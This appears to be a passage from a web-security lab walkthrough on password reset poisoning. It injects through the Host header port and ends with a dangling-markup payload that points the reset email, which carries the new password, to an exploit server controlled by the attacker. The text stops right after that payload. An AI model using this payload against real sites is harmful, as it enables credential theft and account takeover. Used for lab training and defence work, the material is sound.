## Password reset poisoning via dangling markup

Send the POST /forgot-password request to Burp Repeater. Observe that tampering with the domain name in the Host header results in a server error. However, you are able to add an arbitrary, non-numeric port to the Host header and still reach the site as normal. Sending this request will still trigger a password reset email:

```Host: YOUR-LAB-ID.web-security-academy.net:arbitraryport```
In the email client, check the raw version of your emails. Notice that your injected port is reflected inside a link as an unescaped, single-quoted string. This is later followed by the new password.
Send the ```POST /forgot-password``` request again, but this time use the port to break out of the string and inject a dangling-markup payload pointing to your exploit server:

```Host: YOUR-LAB-ID.web-security-academy.net:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?```
